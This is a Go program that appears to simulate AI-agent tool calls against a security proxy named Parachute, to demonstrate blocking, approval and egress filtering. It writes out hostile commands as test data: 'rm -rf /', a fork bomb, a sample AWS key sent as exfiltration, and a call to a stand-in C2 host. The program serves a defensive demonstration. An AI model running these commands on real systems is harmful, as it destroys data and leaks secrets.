package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"time"
)

var (
	parachuteURL = getEnv("PARACHUTE_URL", "http://parachute:8080")
	authUser     = getEnv("PARACHUTE_USER", "admin")
	authPass     = getEnv("PARACHUTE_PASSWORD", "demo")
)

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

// scenario represents a scripted demo event
type scenario struct {
	Name        string
	Description string
	Delay       time.Duration
	Run         func(client *http.Client) error
}

func main() {
	fmt.Println("Parachute Agent Simulator")
	fmt.Println("Generating demo security events...")
	fmt.Println()

	client := &http.Client{Timeout: 30 * time.Second}

	// Wait for Parachute to be ready
	waitForHealthy(client)

	scenarios := []scenario{
		{
			Name:        "Safe Command",
			Description: "Agent runs: ls -la /workspace",
			Delay:       2 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "bash", "ls -la /workspace") },
		},
		{
			Name:        "Safe Command",
			Description: "Agent runs: cat /etc/hostname",
			Delay:       3 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "execute_bash", "cat /etc/hostname") },
		},
		{
			Name:        "Blocked Command (Destructive)",
			Description: "Agent tries: rm -rf /",
			Delay:       4 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "bash", "rm -rf /") },
		},
		{
			Name:        "Blocked Command (Fork Bomb)",
			Description: "Agent tries: :(){ :|:& };:",
			Delay:       3 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "bash", ":(){ :|:& };:") },
		},
		{
			Name:        "Requires Approval (rm)",
			Description: "Agent tries: rm -rf /tmp/old-data",
			Delay:       3 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "bash", "rm -rf /tmp/old-data") },
		},
		{
			Name:        "Requires Approval (sudo)",
			Description: "Agent tries: sudo apt install curl",
			Delay:       3 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "run_command", "sudo apt install curl") },
		},
		{
			Name:        "Auto-Approve Pending",
			Description: "Approving one pending command from the dashboard...",
			Delay:       5 * time.Second,
			Run:         autoApproveFirst,
		},
		{
			Name:        "PII Exfiltration Attempt",
			Description: "Agent sends AWS key: AKIAIOSFODNN7EXAMPLE",
			Delay:       3 * time.Second,
			Run: func(c *http.Client) error {
				return sendBodyWithPII(c, "Here are the credentials: AKIAIOSFODNN7EXAMPLE")
			},
		},
		{
			Name:        "Egress to Blocked Domain",
			Description: "Agent tries to reach: evil-c2-server.com",
			Delay:       3 * time.Second,
			Run: func(c *http.Client) error {
				return sendEgressAttempt(c, "http://evil-c2-server.com/exfil")
			},
		},
		{
			Name:        "Safe Command",
			Description: "Agent runs: echo 'All done!'",
			Delay:       2 * time.Second,
			Run:         func(c *http.Client) error { return sendToolCall(c, "bash", "echo 'All done!'") },
		},
	}

	for cycle := 1; ; cycle++ {
		fmt.Printf("--- Demo Cycle %d ---\n\n", cycle)

		for i, s := range scenarios {
			time.Sleep(s.Delay)
			fmt.Printf("[%d/%d] %s\n", i+1, len(scenarios), s.Name)
			fmt.Printf("       %s\n", s.Description)

			if err := s.Run(client); err != nil {
				fmt.Printf("       -> Result: %v\n", err)
			}
			fmt.Println()
		}

		fmt.Println("--- Cycle complete. Restarting in 15 seconds... ---")
		fmt.Println()
		time.Sleep(15 * time.Second)
	}
}

func waitForHealthy(client *http.Client) {
	fmt.Print("Waiting for Parachute to be ready")
	for i := 0; i < 60; i++ {
		resp, err := client.Get(parachuteURL + "/health")
		if err == nil && resp.StatusCode == 200 {
			resp.Body.Close()
			fmt.Println(" OK")
			return
		}
		if resp != nil {
			resp.Body.Close()
		}
		fmt.Print(".")
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\nWARNING: Parachute may not be ready, continuing anyway...")
}

func sendToolCall(client *http.Client, toolName, command string) error {
	payload := map[string]any{
		"name": toolName,
		"args": map[string]any{
			"command": command,
		},
	}

	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", parachuteURL+"/proxy/tool_call", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.SetBasicAuth(authUser, authPass)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	switch resp.StatusCode {
	case 200:
		fmt.Printf("       -> Allowed (HTTP %d)\n", resp.StatusCode)
	case 403:
		fmt.Printf("       -> Blocked (HTTP %d): %s\n", resp.StatusCode, truncate(string(respBody), 80))
	case 202:
		fmt.Printf("       -> Pending Approval (HTTP %d)\n", resp.StatusCode)
	default:
		fmt.Printf("       -> HTTP %d: %s\n", resp.StatusCode, truncate(string(respBody), 80))
	}

	return nil
}

func sendBodyWithPII(client *http.Client, content string) error {
	req, _ := http.NewRequest("POST", parachuteURL+"/proxy/api/data", bytes.NewReader([]byte(content)))
	req.Header.Set("Content-Type", "text/plain")
	req.SetBasicAuth(authUser, authPass)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	fmt.Printf("       -> PII Detection (HTTP %d): %s\n", resp.StatusCode, truncate(string(respBody), 80))
	return nil
}

func sendEgressAttempt(client *http.Client, targetURL string) error {
	proxyAddr := getEnv("HTTP_PROXY", "http://parachute:8888")
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return fmt.Errorf("invalid proxy URL: %w", err)
	}

	proxyClient := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	resp, err := proxyClient.Get(targetURL)
	if err != nil {
		fmt.Printf("       -> Egress Blocked: %s\n", truncate(err.Error(), 80))
		return nil
	}
	defer resp.Body.Close()
	fmt.Printf("       -> Egress HTTP %d (unexpected)\n", resp.StatusCode)
	return nil
}

func autoApproveFirst(client *http.Client) error {
	req, _ := http.NewRequest("GET", parachuteURL+"/api/pending", nil)
	req.SetBasicAuth(authUser, authPass)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to list pending: %w", err)
	}
	defer resp.Body.Close()

	var pending []map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&pending); err != nil {
		return fmt.Errorf("failed to parse pending list: %w", err)
	}

	if len(pending) == 0 {
		fmt.Println("       -> No pending commands to approve")
		return nil
	}

	id, _ := pending[0]["id"].(string)
	cmd, _ := pending[0]["command"].(string)

	approveReq, _ := http.NewRequest("POST", fmt.Sprintf("%s/api/approve/%s", parachuteURL, id), nil)
	approveReq.SetBasicAuth(authUser, authPass)

	approveResp, err := client.Do(approveReq)
	if err != nil {
		return fmt.Errorf("failed to approve: %w", err)
	}
	defer approveResp.Body.Close()

	fmt.Printf("       -> Approved command %s: %s\n", id, truncate(cmd, 50))
	return nil
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
